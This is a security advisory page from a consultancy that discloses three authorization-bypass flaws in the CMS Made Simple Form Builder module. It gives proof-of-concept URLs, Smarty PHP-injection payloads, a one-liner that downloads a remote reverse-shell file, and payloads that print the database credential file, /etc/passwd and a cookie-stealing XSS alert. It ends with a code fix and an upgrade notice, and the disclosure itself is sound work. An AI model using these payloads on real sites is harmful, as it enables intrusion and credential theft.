<!doctype html>
<html lang="en">       
<head>
  <meta charset="utf-8" />
  <title>CMS Made Simple Form Builder authorization bypass vulnerability - Daylight IT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="theme-color" content="#4caf50">
  <meta name="msapplication-navbutton-color" content="#4caf50">
  <meta name="apple-mobile-web-app-status-bar-style" content="#4caf50">
  <meta name="description" content="Daylight Cyber Security &amp; IT Consultancy">
  <meta property="og:title" content="&lt;strong&gt;Daylight Cyber Security &amp; IT Consultancy&lt;/strong&gt;">
  <meta property="og:url" content="https://www.daylight-it.com/">
  <link rel="stylesheet" type="text/css" media="screen" href="a/style2.css">
</head>
<body>
  <div class="page"><div class="dlborder"><div class="dlborderb"></div></div>
    <div class="content">
      <div class="logo"><b>Daylight Cyber Security &amp; Consultancy</b><a href="https://daylight-it.com/" title="Daylight Cyber Security &amp; IT Consultancy"><img src="a/daylight-logo.png" alt="Logo" title="Daylight Cyber Security &amp; Consultancy"></a></div>
      <h1>Security Advisory</h1>
	    <div class="sa">
Title: 		<b>CMS Made Simple Form Builder authorization bypass vulnerability</b>
Class: 		Bypassing Authorization
CVE:		<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6070" title="CVE Details" target="_blank">CVE-2017-6070</a>  <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6071" title="CVE Details" target="_blank">CVE-2017-6071</a>  <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6072" title="CVE Details" target="_blank">CVE-2017-6072</a>
Remote:		Yes
Local: 		No
Published:	Feb 17 2017 02:00 PM
Updated:	Feb 18 2017 11:00 AM
Credit:		Peter Arts (sec@daylight-it.com)
Vulnerable:	CMS Made Simple Form Builder 0.6.4 (only 2 &amp; 3)
		CMS Made Simple Form Builder 0.7 (only 2 &amp; 3)
		CMS Made Simple Form Builder 0.7.1 (only 2 &amp; 3)
		CMS Made Simple Form Builder 0.7.2 (only 2 &amp; 3)
		CMS Made Simple 1.x Form Builder 0.7.3
		CMS Made Simple 1.x Form Builder 0.7.4
		CMS Made Simple 1.x Form Builder 0.8
		CMS Made Simple 1.x Form Builder 0.8.1.1
		CMS Made Simple 1.x Form Builder 0.8.1.2
		CMS Made Simple 1.x Form Builder 0.8.1.3
		CMS Made Simple 1.x Form Builder 0.8.1.4
	

<b>About the module:</b>
This is the next generation of Feedback Forms, which will include an API for modules to use, as well as a general structured data system. CMSMS 1.12.x and 2.x compatible.
Latest Release: 0.8.1.6, 2017-02-17
Project link: <a href="http://dev.cmsmadesimple.org/projects/formbuilder" rel="nofollow" target="_blank">http://dev.cmsmadesimple.org/projects/formbuilder</a>


<b>Information:</b>
The CMS Made Simple Form Builder module is prone to multiple vulnerabilities that lets remote attackers execute arbitrary code and perform stored XSS attacks because the module fails to check permissions in several admin pages. An attacker may leverage this issue to execute arbitrary PHP code on an affected computer with the privileges of the webserver process. This may facilitate unauthorized access and can be exploited by malicious people to compromise a vulnerable system.

These problems exists in both CMS Made Simple version 1 and 2, but code execution seems to be possible in version 1 only (and depending on Smarty configuration).


<b>Affected versions:</b>
0.7.3 through 0.8.1.5
0.6.4 through 0.8.1.5 (vulnerability 2 &amp; 3)


<b><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6070" title="CVE Details" target="_blank">CVE-2017-6070</a>: Vulnerability 1 (POC):</b>
CMS Made Simple version 1.x Form Builder before version 0.8.1.6 allows remote attackers to execute PHP code via the cntnt01fbrp_forma_form_template parameter in admin_store_form.

Attackers may exploit this issue through a browser. Steps:

1. Open URL: 
<b>http://host/index.php?mact=FormBuilder,cntnt01,admin_store_form,0&amp;cntnt01showtemplate=false&amp;cntnt01form_id=[FORM_ID]</b>
Grab form_id from hidden input field &#8220;cntnt01form_id&#8221; in HTML-source of a published webform on target website or enumerate starting 1.

2. Replace contents of the &#8220;Template to use to Display Form&#8221; (&#8220;cntnt01fbrp_forma_form_template&#8221;) input field with PHP code wrapped in Smarty PHP tags:

<b>{php}
phpinfo();
{/php}</b>

Limitations: cannot use ', &#34;, $, &lt;, &gt;, and several other special characters as these are being escaped or removed by CMS Made Simple input sanitizer. Therefore, for example PHP string open/close characters (‘/&#8221;) cannot be used and one is limited to a subset of characters to prevent PHP parser errors. 
This can be circumvented by downloading remote PHP source file using &#8220;include()&#8221; or &#8220;file_get_contents()&#8221; and saving the contents to a permanent location: 

<b>echo file_put_contents(reverseshell.chr(46).php, file_get_contents([DOWNLOAD_URL]));</b>

If allow_url_fopen is disabled, curl can be used instead.
If PHP tags are disabled in Smarty configuration, &#8220;eval&#8221; can be used instead (see next section).

3. Invoke PHP code by requesting the website page the form has been published on or via:
<b>http://host/index.php?mact=FormBuilder,cntnt01,default,0&amp;cntnt01showtemplate=false&amp;cntnt01form_id=[FORM_ID]</b>

Print CMS Made Simple configuration file, containing database login credentials, output is on the published page: 
<b>{php} echo file_get_contents(config.chr(46).php); {/php}</b>
Print /etc/passwd:
<b>{php} echo file_get_contents(DIRECTORY_SEPARATOR.etc.DIRECTORY_SEPARATOR.passwd); {/php}</b>

Stored XSS example using &#8220;eval&#8221;:
<b>{eval chr(60)}SCRIPT{eval chr(62)}alert(document.cookie){eval chr(60)}{eval chr(47)}SCRIPT{eval chr(62)}</b>



<b><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6071" title="CVE Details" target="_blank">CVE-2017-6071</a>: Vulnerability 2 (POC):</b>
CMS Made Simple version 1.x Form Builder before version 0.8.1.6 allows remote attackers to conduct information-disclosure attacks via exportxml.

Attackers may exploit this issue through a browser. 

<b>http://host/index.php?mact=FormBuilder,cntnt01,exportxml,0&amp;cntnt01showtemplate=false&amp;cntnt01form_id=[FORM_ID]</b>
Grab form_id from hidden input field “cntnt01form_id” in HTML source of a published webform on target website or enumerate starting 1.

Form properties can disclose email addresses.


<b><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6072" title="CVE Details" target="_blank">CVE-2017-6072</a>: Vulnerability 3 (POC):</b>
CMS Made Simple version 1.x Form Builder before version 0.8.1.6 allows remote attackers to conduct information-disclosure attacks via defaultadmin.

Attackers may exploit this issue through a browser. 

<b>http://host/index.php?mact=FormBuilder,cntnt01,defaultadmin,0&amp;cntnt01showtemplate=false</b>

Website forms are being disclosed and XML upload form is visible (contents not being processed).



<b>Solution:</b>
<div class="sa s hl">Add the following line of code to the affected PHP files (action.admin_store_form.php, action.defaultadmin.php, action.exportxml.php):

<b>if (! $this->CheckAccess()) exit;</b>

<font class="important">Please update to version 0.8.1.6. as soon as possible (fixed version).</font></div>
		</div>
	  </div>
    <div class="bg"></div>
  </div>
  <p class="copy">&copy; 2017-2019 <a href="https://daylight-it.com/" title="Daylight Cyber Security &amp; IT Consultancy">Daylight IT</a> - All rights reserved - <a href="responsible-disclosure.html" title="Responsible disclosure" rel="nofollow">Responsible disclosure</a></p>
</body>
</html>